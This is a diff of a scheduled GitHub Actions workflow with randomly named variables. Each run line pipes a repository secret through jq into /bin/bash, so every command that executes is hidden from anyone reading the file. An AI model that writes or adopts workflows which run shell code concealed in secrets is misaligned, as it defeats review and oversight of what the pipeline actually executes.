@@ -1,24 +1,23 @@
 name: yanlaiyanfan
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '28 0/6 * * *'
-
-jobs:  # 11286
+    - cron: '58 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yanlaiyanfan
         env:
-          m16: ${{ secrets.m16 }}
+          dgyd01665: ${{ secrets.dgyd01665 }}
         run: |
-          echo $m16 | jq -r .mpjyh46 | /bin/bash
-          echo $zgp770 | jq -r .iw29967 | /bin/bash
-          echo $xi36 | jq -r .i50 | /bin/bash
-          echo $jvoo5587 | jq -r .wxt93 | /bin/bash
-          echo $qwk3462 | jq -r .yrhm22117 | /bin/bash
-          echo $rbtoc2310 | jq -r .wecu9918 | /bin/bash
-          echo $im605 | jq -r .zsdq254 | /bin/bash
-          echo $xjp89519 | jq -r .ui24 | /bin/bash
+          echo $dgyd01665 | jq -r .ahtcw34 | /bin/bash
+          echo $swm843 | jq -r .dsfx87127 | /bin/bash
+          echo $snzl813 | jq -r .d9643 | /bin/bash
+          echo $ppym40767 | jq -r .jxkn8853 | /bin/bash
+          echo $ja9045 | jq -r .eo07 | /bin/bash
+          echo $ixd62 | jq -r .a6 | /bin/bash
 
